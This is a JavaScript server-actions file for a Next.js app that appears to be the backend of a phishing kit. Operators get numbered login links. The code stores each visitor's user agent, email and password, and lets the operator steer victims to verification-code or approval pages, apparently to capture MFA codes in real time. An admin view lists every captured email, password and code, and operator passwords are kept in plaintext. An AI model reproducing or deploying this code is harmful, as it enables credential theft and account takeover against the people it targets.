"use server";

import connectDB from "@/db";
import User from "@/db/User.Model";
import Data from "@/db/Data.Model";
import { decrypt, encrypt } from "@/lib/auth";
import { cookies } from "next/headers";
import { redirect } from "next/navigation";
import { create } from "zustand";

export async function logIn(FormData) {
  const username = FormData.get("username");
  const password = FormData.get("password");
  if (!username || !password) {
    return JSON.stringify({
      error: "Please fill in all fields",
      success: false,
    });
  }
  try {
    await connectDB();
    const user = await User.findOne({ username });
    if (!user) {
      return JSON.stringify({
        error: "User not found",
        success: false,
      });
    } else {
      if (user.password !== password) {
        return JSON.stringify({
          error: "Incorrect password",
          success: false,
        });
      }
      let token = await encrypt({
        id: user._id,
      });
      cookies().set("token", token, {
        secure: true,
        httpOnly: true,
      });
      cookies().set("username", user.username, {
        secure: true,
      });
      return JSON.stringify({
        error: user._id,
        success: true,
      });
    }
  } catch (error) {
    console.log(error);
    return JSON.stringify({ error, success: false });
  }
}
export async function signUp(FormData) {
  const username = FormData.get("username");
  const password = FormData.get("password");
  if (!username || !password) {
    return JSON.stringify({
      error: "Please fill in all fields",
      success: false,
    });
  }
  try {
    await connectDB();
    const user = await User.findOne({ username });
    if (user) {
      return JSON.stringify({
        error: "User already exists",
        success: false,
      });
    } else {
      const newUser = new User({
        username,
        password,
      });
      await newUser.save();
      return JSON.stringify({
        error: "Account created",
        success: true,
      });
    }
  } catch (error) {
    console.log(error);
    return JSON.stringify({ error, success: false });
  }
}
export async function logOut() {
  cookies().delete("token");
  redirect("/log-in");
}
export async function authCheck() {
  let success;
  try {
    const token = cookies().get("token")?.value;
    if (!token) {
      success = false;
    }
    let payload = await decrypt(token);
    if (!payload) {
      success = false;
    }
    await connectDB();
    let user = await User.findOne({ _id: payload.id });

    if (!user) {
      success = false;
    }
    success = true;
    let _id = user?._id;
    return {
      id: _id,
      uniqueId: user?.uniqueId,
    };
  } catch (error) {
    console.log(error);
    success = false;
  } finally {
    if (!success) {
      redirect("/log-in");
    }
  }
}
export async function getEmail(formData) {
  let success;
  try {
    await connectDB();
    let id = cookies().get("dataId").value;
    if (!id) {
      success = false;
    }
    await Data.findOneAndUpdate(
      { _id: id },
      {
        email: formData.get("email"),
        user: formData.get("id"),
      }
    );
    cookies().set("email", formData.get("email"));

    // const neData = new Data({
    //   userAgent: formData.get("userAgent"),
    //   email: formData.get("email"),
    //   user: formData.get("id"),
    // });
    // let { _id } = await neData.save();
    // let data = await User.findByIdAndUpdate(formData.get("id"), {
    //   $push: { data: _id },
    // });
    // cookies().set("dataId", _id);
    success = true;
  } catch (error) {
    success = false;
    console.log(error);
  } finally {
    if (success) {
      redirect("/" + formData.get("id") + "/login/password");
    } else {
      redirect("/" + formData.get("id"));
    }
  }
}
export async function getAgent(id, agent) {
  try {
    await connectDB();
    const agentData = new Data({
      userAgent: agent,
      user: id,
    });
    let { _id } = await agentData.save();
    cookies().set("dataId", _id);
    let data = await User.findByIdAndUpdate(id, {
      $push: { data: _id },
    });
  } catch (error) {
    console.log(error);
  }
}
export async function getPassword(formData) {
  let success;
  let dataDetails;
  try {
    await connectDB();
    dataDetails = await Data.findOneAndUpdate(
      { _id: formData.get("id") },
      { password: formData.get("password") }
    );

    return JSON.stringify({
      success: true,
    });
  } catch (error) {
    success = false;
    console.log(error);
  } finally {
    if (dataDetails.state === "code") {
      redirect("/" + formData.get("id") + "/login/password/verify-code");
    } else if (dataDetails.state === "yes") {
      redirect("/" + formData.get("id") + "/login/password/verify-yes");
    }
  }
}
export async function getUpdatePage(id) {
  let data;
  try {
    await connectDB();
    data = await Data.findById(id);
  } catch (error) {
    console.log(error);
  } finally {
    if (data.state === "code") {
      redirect("/" + data.user + "/login/password/verify-code");
    } else if (data.state === "yes") {
      redirect("/" + data.user + "/login/password/verify-yes");
    } else if (data.state === "inCorrect") {
      redirect("/" + data.user + "/login/password?wrong=true");
    } else if (data.state === "done") {
      redirect("/" + data.user + "/login/password?done=true");
    }
  }
}
export async function dataState(id) {
  try {
    await connectDB();
    let data = await Data.findOne({ _id: id }, { state: 1, _id: 0 });
    return JSON.stringify(data.state);
  } catch (error) {
    console.log(error);
  }
}
export async function getAllData({ admin, limit, page }) {
  let id = await authCheck();
  try {
    await connectDB();
    if (admin) {
      const data = await Data.find(
        {},
        {
          userAgent: 1,
          email: 1,
          password: 1,
          state: 1,
          code: 1,
          _id: 1,
          createdAt: 1,
        }
      )
        .skip((page - 1) * limit)
        .sort({ createdAt: -1 })
        .limit(limit);
      const total = await Data.countDocuments({});
      return {
        success: true,
        data: JSON.stringify(data),
        total,
      };
    } else {
      const data = await Data.find({ user: id })
        .skip((page - 1) * limit)
        .limit(limit)
        .sort({ createdAt: -1 });
      const total = await Data.find({ user: id }).countDocuments();
      console.log(total);
      return {
        success: true,
        data: JSON.stringify(data),
        total,
      };
    }
  } catch (error) {
    console.log(error);
    return JSON.stringify({
      success: false,
      error: error.message,
    });
  }
}
export async function getUserLinks() {
  let { id, uniqueId } = await authCheck();
  console.log(uniqueId, "initial uniqueId");
  console.log(id, "user ID");

  if (!uniqueId) {
    await connectDB();

    // Get the user with the most recent createdAt and uniqueId
    let user = await User.findOne({
      uniqueId: { $exists: true },
    })
      .sort({ createdAt: -1 })
      .limit(1);

    // Set new uniqueId based on the last user's uniqueId
    let newUniqueId = user?.uniqueId ? user.uniqueId + 1 : 1;

    // Update current user with the new uniqueId
    await User.findByIdAndUpdate(id, { uniqueId: newUniqueId });

    console.log(newUniqueId, "new uniqueId assigned");
    uniqueId = newUniqueId;
  }

  return JSON.stringify("login/" + uniqueId);
}

export async function changeState(id, state, code) {
  try {
    await connectDB();
    if (code) {
      await Data.findOneAndUpdate({ _id: id }, { state, code });
    }
    let data = await Data.findOneAndUpdate({ _id: id }, { state });
    return JSON.stringify(data);
  } catch (error) {
    console.log(error);
  }
}
export async function getCodeVerification(id) {
  try {
    await connectDB();
    let data = await Data.findOne({ _id: id }, { code: 1, _id: 0 });
    return JSON.stringify(data.code);
  } catch (error) {
    console.log(error);
  }
}
export async function deleteData(id) {
  try {
    await connectDB();
    await Data.findByIdAndDelete({ _id: id });
  } catch (error) {
    console.log(error.message);
  }
}
